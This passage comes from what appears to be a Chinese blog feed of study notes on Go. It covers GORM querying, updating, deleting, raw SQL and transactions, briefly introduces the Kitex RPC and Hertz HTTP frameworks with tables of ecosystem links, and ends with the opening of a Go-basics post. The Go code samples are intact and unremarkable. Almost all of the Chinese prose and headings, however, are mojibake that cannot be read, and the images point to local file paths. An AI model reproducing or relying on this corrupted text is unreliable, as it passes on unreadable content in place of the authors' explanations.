<h4 id="æ£€ç´¢å…¨éƒ¨å¯¹è±¡"><a href="#æ£€ç´¢å…¨éƒ¨å¯¹è±¡" class="headerlink" title="æ£€ç´¢å…¨éƒ¨å¯¹è±¡"></a>æ£€ç´¢å…¨éƒ¨å¯¹è±¡</h4><p>ç›´æ¥é€šè¿‡findå»æŸ¥æ‰¾å³å¯ï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯ä¸€ä¸‹çš„éƒ¨åˆ†</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">result.RowsAffected <span class="comment">// returns found records count, equals `len(users)`</span></span><br><span class="line">result.Error        <span class="comment">// returns error</span></span><br></pre></td></tr></table></figure>

<h4 id="é€šè¿‡æ¡ä»¶æ£€ç´¢"><a href="#é€šè¿‡æ¡ä»¶æ£€ç´¢" class="headerlink" title="é€šè¿‡æ¡ä»¶æ£€ç´¢"></a>é€šè¿‡æ¡ä»¶æ£€ç´¢</h4><h5 id="Stringæ¡ä»¶"><a href="#Stringæ¡ä»¶" class="headerlink" title="Stringæ¡ä»¶"></a>Stringæ¡ä»¶</h5><p>ä½¿ç”¨Whereæ–¹æ³•å³å¯</p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20241112180255808.png" alt="image-20241112180255808"></p>
<h5 id="é€šè¿‡Struct-Mapæ£€ç´¢"><a href="#é€šè¿‡Struct-Mapæ£€ç´¢" class="headerlink" title="é€šè¿‡Struct&amp;Mapæ£€ç´¢"></a>é€šè¿‡Struct&amp;Mapæ£€ç´¢</h5><p>å¯ä»¥é€šè¿‡ç»“æ„ä½“å’ŒMapå»è¾¾åˆ°åŒ¹é…å¤šé¡¹çš„æ¡ä»¶æŸ¥è¯¢çš„ç›®çš„</p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20241112180751008.png" alt="image-20241112180751008"></p>
<p>ä½†è¿™é‡Œæœ‰ä¸€ç‚¹è¦æ³¨æ„çš„å°±æ˜¯ï¼Œä½¿ç”¨ç»“æ„ä½“æŸ¥è¯¢æ˜¯ä¸ä¼šåŒ¹é…ç©ºå­—ç¬¦ä¸²æˆ–è€…0çš„ï¼Œä¼šè¿›è¡Œå¿½ç•¥ï¼Œåªæœ‰ä½¿ç”¨mapçš„è¯æ‰èƒ½å®Œæˆå¯¹åº”çš„åŒ¹é…</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.Where(&amp;User&#123;Name: <span class="string">&quot;jinzhu&quot;</span>, Age: <span class="number">0</span>&#125;).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name = &quot;jinzhu&quot;;</span></span><br><span class="line"></span><br><span class="line">db.Where(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;<span class="string">&quot;Name&quot;</span>: <span class="string">&quot;jinzhu&quot;</span>, <span class="string">&quot;Age&quot;</span>: <span class="number">0</span>&#125;).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name = &quot;jinzhu&quot; AND age = 0;</span></span><br></pre></td></tr></table></figure>

<h3 id="3ã€æ›´æ–°"><a href="#3ã€æ›´æ–°" class="headerlink" title="3ã€æ›´æ–°"></a>3ã€æ›´æ–°</h3><h4 id="ä¿å­˜æ‰€æœ‰å­—æ®µ"><a href="#ä¿å­˜æ‰€æœ‰å­—æ®µ" class="headerlink" title="ä¿å­˜æ‰€æœ‰å­—æ®µ"></a>ä¿å­˜æ‰€æœ‰å­—æ®µ</h4><p><code>Save</code>æ˜¯ä¹Ÿè´µç»„åˆå‡½æ•°ã€‚å¦‚æœä¿å­˜å€¼ä¸åŒ…å«ä¸»é”®ï¼Œå®ƒå°†æ‰§è¡Œ <code>Create</code>ï¼Œå¦åˆ™å®ƒå°†æ‰§è¡Œ <code>Update</code> (åŒ…å«æ‰€æœ‰å­—æ®µ)ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.Save(&amp;User&#123;Name: <span class="string">&quot;jinzhu&quot;</span>, Age: <span class="number">100</span>&#125;)</span><br><span class="line"><span class="comment">// INSERT INTO `users` (`name`,`age`,`birthday`,`update_at`) VALUES (&quot;jinzhu&quot;,100,&quot;0000-00-00 00:00:00&quot;,&quot;0000-00-00 00:00:00&quot;)</span></span><br><span class="line"></span><br><span class="line">db.Save(&amp;User&#123;ID: <span class="number">1</span>, Name: <span class="string">&quot;jinzhu&quot;</span>, Age: <span class="number">100</span>&#125;)</span><br><span class="line"><span class="comment">// UPDATE `users` SET `name`=&quot;jinzhu&quot;,`age`=100,`birthday`=&quot;0000-00-00 00:00:00&quot;,`update_at`=&quot;0000-00-00 00:00:00&quot; WHERE `id` = 1</span></span><br></pre></td></tr></table></figure>

<h4 id="æ›´æ–°å•ä¸ªåˆ—"><a href="#æ›´æ–°å•ä¸ªåˆ—" class="headerlink" title="æ›´æ–°å•ä¸ªåˆ—"></a>æ›´æ–°å•ä¸ªåˆ—</h4><p>è¿™å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥ä½¿ç”¨updateå³å¯ã€‚</p>
<h4 id="æ›´æ–°å¤šä¸ªåˆ—"><a href="#æ›´æ–°å¤šä¸ªåˆ—" class="headerlink" title="æ›´æ–°å¤šä¸ªåˆ—"></a>æ›´æ–°å¤šä¸ªåˆ—</h4><p>ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œä½¿ç”¨ç»“æ„ä½“å’Œmapå°±è¡Œï¼Œèƒ½å¤Ÿè¿›è¡Œå¤šåˆ—çš„æ›´æ–°ã€‚</p>
<h4 id="æ›´æ–°æ‰€é€‰å®šçš„å­—æ®µ"><a href="#æ›´æ–°æ‰€é€‰å®šçš„å­—æ®µ" class="headerlink" title="æ›´æ–°æ‰€é€‰å®šçš„å­—æ®µ"></a>æ›´æ–°æ‰€é€‰å®šçš„å­—æ®µ</h4><p>è¿™é‡Œå¯ä»¥é€šè¿‡åŠ ä¸€äº›é€‰æ‹©è¿›è¡Œå¯¹åº”é€‰å®šå­—æ®µçš„æ›´æ–°ã€‚</p>
<h3 id="4ã€åˆ é™¤"><a href="#4ã€åˆ é™¤" class="headerlink" title="4ã€åˆ é™¤"></a>4ã€åˆ é™¤</h3><p>æœ€åå°±æ˜¯åˆ é™¤äº†ï¼Œåˆ é™¤åº”è¯¥ç®—æ˜¯æœ€ç®€å•çš„äº†</p>
<p>ç›´æ¥å°±æ˜¯å¯ä»¥é€šè¿‡Deleteå»å¯¹æŸåˆ—è¿›è¡Œåˆ é™¤ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¸¦é¢å¤–æ¡ä»¶çš„åˆ é™¤</span></span><br><span class="line">db.Where(<span class="string">&quot;name = ?&quot;</span>, <span class="string">&quot;jinzhu&quot;</span>).Delete(&amp;email)</span><br><span class="line"><span class="comment">// DELETE from emails where id = 10 AND name = &quot;jinzhu&quot;;</span></span><br></pre></td></tr></table></figure>

<h3 id="5ã€åŸç”ŸSLQçš„ä½¿ç”¨"><a href="#5ã€åŸç”ŸSLQçš„ä½¿ç”¨" class="headerlink" title="5ã€åŸç”ŸSLQçš„ä½¿ç”¨"></a>5ã€åŸç”ŸSLQçš„ä½¿ç”¨</h3><p>ä½¿ç”¨Rawå’ŒScanå»æŒ‡å®šSQLè¯­å¥</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> result Result</span><br><span class="line">db.Raw(<span class="string">&quot;SELECT id, name, age FROM users WHERE id = ?&quot;</span>, <span class="number">3</span>).Scan(&amp;result)</span><br></pre></td></tr></table></figure>

<p>ExecåŸç”ŸSQL</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Exec with SQL Expression</span></span><br><span class="line">db.Exec(<span class="string">&quot;UPDATE users SET money = ? WHERE name = ?&quot;</span>, gorm.Expr(<span class="string">&quot;money * ? + ?&quot;</span>, <span class="number">10000</span>, <span class="number">1</span>), <span class="string">&quot;jinzhu&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="4ã€äº‹åŠ¡"><a href="#4ã€äº‹åŠ¡" class="headerlink" title="4ã€äº‹åŠ¡"></a>4ã€äº‹åŠ¡</h2><h3 id="ç¦ç”¨é»˜è®¤äº‹åŠ¡"><a href="#ç¦ç”¨é»˜è®¤äº‹åŠ¡" class="headerlink" title="ç¦ç”¨é»˜è®¤äº‹åŠ¡"></a>ç¦ç”¨é»˜è®¤äº‹åŠ¡</h3><p>ä¸ºäº†ç¡®ä¿æ•°æ®ä¸€è‡´æ€§ï¼ŒGORM ä¼šåœ¨äº‹åŠ¡é‡Œæ‰§è¡Œå†™å…¥æ“ä½œï¼ˆåˆ›å»ºã€æ›´æ–°ã€åˆ é™¤ï¼‰ã€‚å¦‚æœæ²¡æœ‰è¿™æ–¹é¢çš„è¦æ±‚ï¼Œæ‚¨å¯ä»¥åœ¨åˆå§‹åŒ–æ—¶ç¦ç”¨å®ƒï¼Œè¿™å°†è·å¾—å¤§çº¦ 30%+ æ€§èƒ½æå‡ã€‚</p>
<p>å¯ä»¥é€šè¿‡SkipDefaultTransactionå¯¹åº”é…ç½®å»å…³é—­</p>
<h3 id="æ‰‹åŠ¨äº‹åŠ¡"><a href="#æ‰‹åŠ¨äº‹åŠ¡" class="headerlink" title="æ‰‹åŠ¨äº‹åŠ¡"></a>æ‰‹åŠ¨äº‹åŠ¡</h3><p>Gorm æ”¯æŒç›´æ¥è°ƒç”¨äº‹åŠ¡æ§åˆ¶æ–¹æ³•ï¼ˆcommitã€rollbackï¼‰ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¼€å§‹äº‹åŠ¡</span></span><br><span class="line">tx := db.Begin()</span><br><span class="line"><span class="comment">// åœ¨äº‹åŠ¡ä¸­æ‰§è¡Œä¸€äº› db æ“ä½œï¼ˆä»è¿™é‡Œå¼€å§‹ï¼Œæ‚¨åº”è¯¥ä½¿ç”¨ &#x27;tx&#x27; è€Œä¸æ˜¯ &#x27;db&#x27;ï¼‰</span></span><br><span class="line">tx.Create(...)</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// é‡åˆ°é”™è¯¯æ—¶å›æ»šäº‹åŠ¡</span></span><br><span class="line">tx.Rollback()</span><br><span class="line"><span class="comment">// å¦åˆ™ï¼Œæäº¤äº‹åŠ¡</span></span><br><span class="line">tx.Commit()</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å·®ä¸å¤šï¼ŒGormçš„ä½¿ç”¨æˆ‘ä»¬å¤§è‡´ä¹Ÿå°±äº†è§£äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è®©æˆ‘ä»¬è¿›å…¥Kitexçš„å­¦ä¹ !</p>
<h3 id="è‡ªåŠ¨æäº¤äº‹åŠ¡"><a href="#è‡ªåŠ¨æäº¤äº‹åŠ¡" class="headerlink" title="è‡ªåŠ¨æäº¤äº‹åŠ¡"></a>è‡ªåŠ¨æäº¤äº‹åŠ¡</h3><p>Gormæä¾›äº†Tansactionæ–¹æ³•ç”¨äºè‡ªåŠ¨æäº¤äº‹åŠ¡ï¼Œé¿å…ç”¨æˆ·æ¼å†™Commitã€Rollback</p>
<h2 id="5ã€Gormç”Ÿæ€"><a href="#5ã€Gormç”Ÿæ€" class="headerlink" title="5ã€Gormç”Ÿæ€"></a>5ã€Gormç”Ÿæ€</h2><table>
<thead>
<tr>
<th>GORM ä»£ç ç”Ÿæˆå·¥å…·</th>
<th><a href="https://github.com/go-gorm/gen">https://github.com/go-gorm/gen</a></th>
</tr>
</thead>
<tbody><tr>
<td>GORM åˆ†ç‰‡åº“æ–¹æ¡ˆ</td>
<td><a href="https://github.com/go-gorm/sharding">https://github.com/go-gorm/sharding</a></td>
</tr>
<tr>
<td>GORM æ‰‹åŠ¨ç´¢å¼•</td>
<td><a href="https://github.com/go-gorm/hints">https://github.com/go-gorm/hints</a></td>
</tr>
<tr>
<td>GORM ä¹è§‚é”</td>
<td><a href="https://github.com/go-gorm/optimisticlock">https://github.com/go-gorm/optimisticlock</a></td>
</tr>
<tr>
<td>GORM è¯»å†™åˆ†ç¦»</td>
<td><a href="https://github.com/go-gorm/dbresolver">https://github.com/go-gorm/dbresolver</a></td>
</tr>
<tr>
<td>GORM OpenTelemetryæ‰©å±•</td>
<td><a href="https://github.com/go-gorm/opentelemetry">https://github.com/go-gorm/opentelemetry</a></td>
</tr>
</tbody></table>
<p>å…³äºæ›´å¤šçš„GORMç”¨æ³•å¯ä»¥æŸ¥çœ‹Gormçš„æ–‡æ¡£ï¼ˆ<a href="https://gorm.cn/">https://gorm.cn</a>)</p>
<h2 id="6ã€Kitex"><a href="#6ã€Kitex" class="headerlink" title="6ã€Kitex"></a>6ã€Kitex</h2><p>è¿™é‡Œå…ˆç»™ä¸Šä¸€ä¸ªå­¦ä¹ é“¾æ¥ï¼Œæœ¬æ¬¡æ€»ç»“ä¹Ÿæ˜¯ä¸»è¦é’ˆå¯¹é“¾æ¥å†…å®¹è¿›è¡Œçš„<a href="https://www.cloudwego.io/zh/docs/kitex/getting-started/">https://www.cloudwego.io/zh/docs/kitex/getting-started/</a></p>
<p>é¦–å…ˆè¿™è¾¹å°±æ˜¯è¦å…ˆä»RPCå¼€å§‹ã€‚</p>
<h3 id="RPCæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#RPCæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="RPCæ˜¯ä»€ä¹ˆï¼Ÿ"></a>RPCæ˜¯ä»€ä¹ˆï¼Ÿ</h3><p><strong>RPC</strong> (Remote Procedure Call) ï¼Œå³è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ã€‚é€šä¿—æ¥è®²ï¼Œå°±æ˜¯è°ƒç”¨è¿œç«¯æœåŠ¡çš„æŸä¸ªæ–¹æ³•ï¼Œå¹¶è·å–åˆ°å¯¹åº”çš„å“åº”ã€‚RPC æœ¬è´¨ä¸Šå®šä¹‰äº†ä¸€ç§é€šä¿¡çš„æµç¨‹ï¼Œè€Œå…·ä½“çš„å®ç°æŠ€æœ¯æ²¡æœ‰çº¦æŸï¼Œæ ¸å¿ƒéœ€è¦è§£å†³çš„é—®é¢˜ä¸º<strong>åºåˆ—åŒ–</strong>ä¸<strong>ç½‘ç»œé€šä¿¡</strong>ã€‚å¦‚å¯ä»¥é€šè¿‡ <code>gob/json/pb/thrift</code> æ¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¶ˆæ¯å†…å®¹ï¼Œé€šè¿‡ <code>socket/http</code> æ¥è¿›è¡Œç½‘ç»œé€šä¿¡ã€‚åªè¦å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯åœ¨è¿™ä¸¤æ–¹é¢è¾¾æˆå…±è¯†ï¼Œèƒ½å¤Ÿåšåˆ°æ¶ˆæ¯æ­£ç¡®çš„è§£ææ¥å£å³å¯ã€‚</p>
<blockquote>
<p>ä¸ªäººç†è§£å°±æ˜¯å’ŒHTTPæŒºç±»ä¼¼çš„ä½œç”¨ï¼Œä½¿ç”¨RPCå»èƒ½å¤Ÿå®ç°ç±»ä¼¼HTTPè¿œç¨‹è®¿é—®çš„æ•ˆæœ</p>
</blockquote>
<p>è¿™é‡Œå°±è¿˜è¦è®²åˆ°ä¸€ä¸ªä¸œè¥¿ï¼Œä¹Ÿå°±æ˜¯IDLï¼Œè¿™ä¸ªåœ¨RPCä¸­ååˆ†çš„é‡è¦</p>
<h3 id="IDCåˆæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#IDCåˆæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="IDCåˆæ˜¯ä»€ä¹ˆï¼Ÿ"></a>IDCåˆæ˜¯ä»€ä¹ˆï¼Ÿ</h3><p><strong>IDL</strong> å…¨ç§°æ˜¯ Interface Definition Languageï¼Œæ¥å£å®šä¹‰è¯­è¨€ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨ RPC è¿›è¡Œè°ƒç”¨ï¼Œå°±éœ€è¦çŸ¥é“å¯¹æ–¹çš„æ¥å£æ˜¯ä»€ä¹ˆï¼Œéœ€è¦ä¼ ä»€ä¹ˆå‚æ•°ï¼ŒåŒæ—¶ä¹Ÿéœ€è¦çŸ¥é“è¿”å›å€¼æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œå°±å¥½æ¯”ä¸¤ä¸ªäººä¹‹é—´äº¤æµï¼Œéœ€è¦ä¿è¯åœ¨è¯´çš„æ˜¯åŒä¸€ä¸ªè¯­è¨€ã€åŒä¸€ä»¶äº‹ã€‚IDL å°±æ˜¯ä¸ºäº†è§£å†³è¿™æ ·çš„é—®é¢˜ï¼Œé€šè¿‡ IDL æ¥çº¦å®šåŒæ–¹çš„åè®®ï¼Œå°±åƒåœ¨å†™ä»£ç çš„æ—¶å€™éœ€è¦è°ƒç”¨æŸä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ <code>ç­¾å</code>ä¸€æ ·ã€‚</p>
<p>å¯¹äº RPC æ¡†æ¶ï¼ŒIDL ä¸ä»…ä½œä¸ºæ¥å£æè¿°è¯­è¨€ï¼Œè¿˜ä¼šæ ¹æ® IDL æ–‡ä»¶ç”ŸæˆæŒ‡å®šè¯­è¨€çš„æ¥å£å®šä¹‰æ¨¡å—ï¼Œè¿™æ ·æå¤§ç®€åŒ–äº†å¼€å‘å·¥ä½œã€‚æœåŠ¡æä¾›æ–¹ï¼ˆæœåŠ¡ç«¯ï¼‰éœ€è¦åšçš„å˜ä¸º ç¼–å†™ IDL -&gt; ä½¿ç”¨ä»£ç ç”Ÿæˆå·¥å…·ç”Ÿæˆä»£ç  -&gt; å®ç°æ¥å£ï¼›æœåŠ¡è°ƒç”¨æ–¹ï¼ˆå®¢æˆ·ç«¯ï¼‰åªéœ€æ ¹æ®æœåŠ¡æä¾›æ–¹ï¼ˆæœåŠ¡ç«¯ï¼‰æä¾›çš„ IDL ç”Ÿæˆä»£ç åè¿›è¡Œè°ƒç”¨ã€‚è¿™å½“ä¸­è¿˜æœ‰æœåŠ¡å‘ç°ã€è´Ÿè½½å‡è¡¡ç­‰é—®é¢˜ï¼Œä½†ä¸å±äº IDL èŒƒç•´ï¼Œæ•…ä¸å±•å¼€ä»‹ç»ã€‚</p>
<p>Kitex é»˜è®¤æ”¯æŒ <code>thrift</code> å’Œ <code>proto3</code> ä¸¤ç§ IDLã€‚</p>
<p>å¯¹åº”çš„è¯­æ³•å‚è€ƒé“¾æ¥ï¼š</p>
<p>Thrift IDL è¯­æ³•å¯å‚è€ƒï¼š<a href="http://thrift.apache.org/docs/idl">Thrift interface description language</a>ã€‚</p>
<p>proto3 è¯­æ³•å¯å‚è€ƒï¼š<a href="https://developers.google.com/protocol-buffers/docs/proto3">Language Guide(proto3)</a>ã€‚</p>
<blockquote>
<p>å¯¹äºKitexæ¡†æ¶çš„çŸ¥è¯†ç‚¹ï¼ŒçŸ­æ—¶é—´å†…é¡µæ— æ³•è®²è§£æ¸…æ¥šï¼Œå¼ºé›·å»ºè®®å°±æ˜¯å»çœ‹çœ‹ä¸Šé¢å®˜ç½‘ä¸­çš„é‚£ä¸ªå°æ¡ˆä¾‹ï¼Œèƒ½å¤Ÿç†è§£æ˜ç™½å¾ˆå¤šã€‚</p>
</blockquote>
<h2 id="7ã€Kitexç”Ÿæ€"><a href="#7ã€Kitexç”Ÿæ€" class="headerlink" title="7ã€Kitexç”Ÿæ€"></a>7ã€Kitexç”Ÿæ€</h2><table>
<thead>
<tr>
<th>XDS æ‰©å±•</th>
<th><a href="https://github.com/kitex-contrib/xds">https://github.com/kitex-contrib/xds</a></th>
</tr>
</thead>
<tbody><tr>
<td>opentelemetry æ‰©å±•</td>
<td><a href="https://github.com/kitex-contrib/obs-opentelemetry">https://github.com/kitex-contrib/obs-opentelemetry</a></td>
</tr>
<tr>
<td>ETCD æœåŠ¡æ³¨å†Œä¸å‘ç°æ‰©å±•</td>
<td><a href="https://github.com/kitex-contrib/registry-etcd">https://github.com/kitex-contrib/registry-etcd</a></td>
</tr>
<tr>
<td>Nacos æœåŠ¡æ³¨å†Œä¸å‘ç°æ‰©å±•</td>
<td><a href="https://github.com/kitex-contrib/registry-nacos">https://github.com/kitex-contrib/registry-nacos</a></td>
</tr>
<tr>
<td>Zookeeper æœåŠ¡æ³¨å†Œä¸å‘ç°æ‰©å±•</td>
<td><a href="https://github.com/kitex-contrib/registry-zookeeper">https://github.com/kitex-contrib/registry-zookeeper</a></td>
</tr>
<tr>
<td>polaris æ‰©å±•</td>
<td><a href="https://github.com/kitex-contrib/polaris">https://github.com/kitex-contrib/polaris</a></td>
</tr>
<tr>
<td>ä¸°å¯Œçš„ç¤ºä¾‹ä»£ç ä¸ä¸šåŠ¡Demo</td>
<td><a href="https://github.com/cloudwego/kitex-examples/">https://github.com/cloudwego/kitex-examples/</a></td>
</tr>
</tbody></table>
<h2 id="8ã€Hertz"><a href="#8ã€Hertz" class="headerlink" title="8ã€Hertz"></a>8ã€Hertz</h2><h3 id="ç®€å•ä»‹ç»"><a href="#ç®€å•ä»‹ç»" class="headerlink" title="ç®€å•ä»‹ç»"></a>ç®€å•ä»‹ç»</h3><p>Hertz[hÉ™Ëts] æ˜¯ä¸€ä¸ª Golang å¾®æœåŠ¡ HTTP æ¡†æ¶ï¼Œåœ¨è®¾è®¡ä¹‹åˆå‚è€ƒäº†å…¶ä»–å¼€æºæ¡†æ¶ <a href="https://github.com/valyala/fasthttp">fasthttp</a>ã€<a href="https://github.com/gin-gonic/gin">gin</a>ã€<a href="https://github.com/labstack/echo">echo</a> çš„ä¼˜åŠ¿ï¼Œ å¹¶ç»“åˆå­—èŠ‚è·³åŠ¨å†…éƒ¨çš„éœ€æ±‚ï¼Œä½¿å…¶å…·æœ‰é«˜æ˜“ç”¨æ€§ã€é«˜æ€§èƒ½ã€é«˜æ‰©å±•æ€§ç­‰ç‰¹ç‚¹ï¼Œç›®å‰åœ¨å­—èŠ‚è·³åŠ¨å†…éƒ¨å·²å¹¿æ³›ä½¿ç”¨ã€‚ å¦‚ä»Šè¶Šæ¥è¶Šå¤šçš„å¾®æœåŠ¡é€‰æ‹©ä½¿ç”¨ Golangï¼Œå¦‚æœå¯¹å¾®æœåŠ¡æ€§èƒ½æœ‰è¦æ±‚ï¼Œåˆå¸Œæœ›æ¡†æ¶èƒ½å¤Ÿå……åˆ†æ»¡è¶³å†…éƒ¨çš„å¯å®šåˆ¶åŒ–éœ€æ±‚ï¼ŒHertz ä¼šæ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ã€‚</p>
<p>çœ‹çœ‹æ–‡æ¡£å°±å¾ˆèƒ½æ˜ç™½å…¶å®å’Œginæ¡†æ¶è¿˜æ˜¯å¾ˆç›¸ä¼¼çš„ï¼Œä½†ç›¸æ¯”ginè€Œè¨€ï¼ŒHertzæœ‰ä¸€ä¸ªå¾ˆå¥½çš„ç‚¹ï¼Œå°±æ˜¯æœ‰è‡ªåŠ¨ä»£ç ç”Ÿæˆï¼Œä¹Ÿå°±æ˜¯å’Œä¸Šé¢çš„Kitexç±»ä¼¼çš„IDLï¼Œä½¿ç”¨IDLæ¥å£å»è‡ªåŠ¨ç”Ÿæˆå¯¹åº”ä»£ç ï¼Œèƒ½å¤Ÿå¤§å¤§æ–¹ä¾¿æˆ‘ä»¬å»ç¼–å†™å¯¹åº”çš„ä»£ç ï¼Œååˆ†çš„æ–¹ä¾¿ã€‚</p>
<h2 id="9ã€Hertzç”Ÿæ€"><a href="#9ã€Hertzç”Ÿæ€" class="headerlink" title="9ã€Hertzç”Ÿæ€"></a>9ã€Hertzç”Ÿæ€</h2><table>
<thead>
<tr>
<th>HTTP2 æ‰©å±•</th>
<th><a href="https://github.com/hertz-contrib/http2">https://github.com/hertz-contrib/http2</a></th>
</tr>
</thead>
<tbody><tr>
<td>opentelemetry æ‰©å±•</td>
<td><a href="https://github.com/hertz-contrib/obs-opentelemetry">https://github.com/hertz-contrib/obs-opentelemetry</a></td>
</tr>
<tr>
<td>å›½é™…åŒ–æ‰©å±•</td>
<td><a href="https://github.com/hertz-contrib/i18n">https://github.com/hertz-contrib/i18n</a></td>
</tr>
<tr>
<td>åå‘ä»£ç†æ‰©å±•</td>
<td><a href="https://github.com/hertz-contrib/reverseproxy">https://github.com/hertz-contrib/reverseproxy</a></td>
</tr>
<tr>
<td>JWT é‰´æƒæ‰©å±•</td>
<td><a href="https://github.com/hertz-contrib/jwt">https://github.com/hertz-contrib/jwt</a></td>
</tr>
<tr>
<td>Websocket æ‰©å±•</td>
<td><a href="https://github.com/hertz-contrib/websocket">https://github.com/hertz-contrib/websocket</a></td>
</tr>
<tr>
<td>ä¸°å¯Œçš„ç¤ºä¾‹ä»£ç ä¸ä¸š Demo</td>
<td><a href="https://github.com/cloudwego/hertz-examples/">https://github.com/cloudwego/hertz-examples/</a></td>
</tr>
</tbody></table>
<h2 id="10ã€æœ€åçš„å°æ€»ç»“"><a href="#10ã€æœ€åçš„å°æ€»ç»“" class="headerlink" title="10ã€æœ€åçš„å°æ€»ç»“"></a>10ã€æœ€åçš„å°æ€»ç»“</h2><p>ä¸ªäººæ„Ÿè§‰å­—èŠ‚çš„è¿™å¥—æ¡†æ¶å¾ˆå¤§ç¨‹åº¦çš„æ–¹ä¾¿äº†ç¨‹åºå‘˜çš„ä»£ç ç¼–å†™ï¼Œç‰¹åˆ«æ˜¯åŠ å…¥äº†å¾ˆå¤šç§ç±»å‹çš„è‡ªåŠ¨ä»£ç ç”Ÿæˆï¼Œé¿å…äº†ä¸€äº›ç®€å•é‡å¤ä»£ç çš„å¤šæ¬¡ç¼–å†™ï¼Œæ„Ÿè§‰è¿™æ–¹é¢å°±éå¸¸å¥½ã€‚è€Œä¸”é€šè¿‡è¿™æ¬¡çš„å­¦ä¹ ï¼Œæˆ‘å‘ç°ï¼Œå­¦ä¹ è¿˜å¾—æ˜¯çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œå®˜æ–¹æ–‡æ¡£è®²çš„å¾ˆç»†å¾ˆé€å½»ï¼ŒåŠ ä¸Šå­—èŠ‚å¯¹äºæ–‡æ¡£å»ºè®¾è¿˜æ˜¯éå¸¸å¥½çš„ï¼Œè§†é¢‘çš„è¯æ›´å¤šçš„èµ·åˆ°çš„æ˜¯ä¸€ä¸ªå¼•å¯¼çš„ä½œç”¨ï¼Œæ›´å¤šçš„è¿˜å¾—æ˜¯çœ‹è‡ªå·±çš„å­¦ä¹ ï¼</p>
]]></content>
  </entry>
  <entry>
    <title>goåŸºç¡€å­¦ä¹ </title>
    <url>/2024/10/21/go%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>æœ€è¿‘ä¹Ÿæ˜¯å¼€å§‹å°è¯•å»å­¦ä¹ ä¸€äº›goè¯­è¨€ç›¸å…³çš„çŸ¥è¯†</p>
<p>åŸºäºç‹‚ç¥çš„goè¯­è¨€çš„ç›¸å…³è¯¾ç¨‹ï¼</p>
<span id="more"></span>

<h1 id="ä¸€ã€goè¯­è¨€çš„èƒŒæ™¯ä»¥åŠä¸‹è½½å®‰è£…é…ç½®"><a href="#ä¸€ã€goè¯­è¨€çš„èƒŒæ™¯ä»¥åŠä¸‹è½½å®‰è£…é…ç½®" class="headerlink" title="ä¸€ã€goè¯­è¨€çš„èƒŒæ™¯ä»¥åŠä¸‹è½½å®‰è£…é…ç½®"></a>ä¸€ã€goè¯­è¨€çš„èƒŒæ™¯ä»¥åŠä¸‹è½½å®‰è£…é…ç½®</h1><h2 id="goè¯­è¨€çš„åˆ›å§‹"><a href="#goè¯­è¨€çš„åˆ›å§‹" class="headerlink" title="goè¯­è¨€çš„åˆ›å§‹"></a>goè¯­è¨€çš„åˆ›å§‹</h2><blockquote>
<p>ä¸ºä»€ä¹ˆéœ€è¦goè¯­è¨€çš„</p>
</blockquote>
<p>C ç³»ç»Ÿæ•ˆç‡  å¼€å‘èµ·æ¥æ¯”è¾ƒå¤æ‚ </p>
<p>Java å¼€å‘ç›¸å¯¹æ¥è¯´ç®€å•äº† ï¼ˆé¢å‘å¯¹è±¡â€”ï¼‰æ›´ç¬¦åˆäººçš„æ€ç»´  å¾ˆå¤šå¤§å‹ä¼ä¸šåœ¨ç”¨  åŸ¹è®­æœºæ„  ssm ssh  springboot   java äººæ‰å¤š  å•ä»·ä½</p>
<p>æ•ˆç‡è¦é«˜ + å¼€å‘ç®€å• &#x3D;  å…¼é¡¾  ï¼ˆåˆ›é€ ä¸€ç§æ–°è¯­è¨€  Goï¼‰   12 å¹´  ç§»åŠ¨ç«¯ æ™ºèƒ½æ‰‹æœº   85   95   æ—¶ä»£è¿›æ­¥äº†ï¼Œæˆ‘ä»¬éœ€è¦ä¸€äº›æ›´é«˜æ•ˆçš„ä¸œè¥¿ï¼Œè€Œä¸æ˜¯ä¸€äº›å†å²çš„ä¸œè¥¿</p>
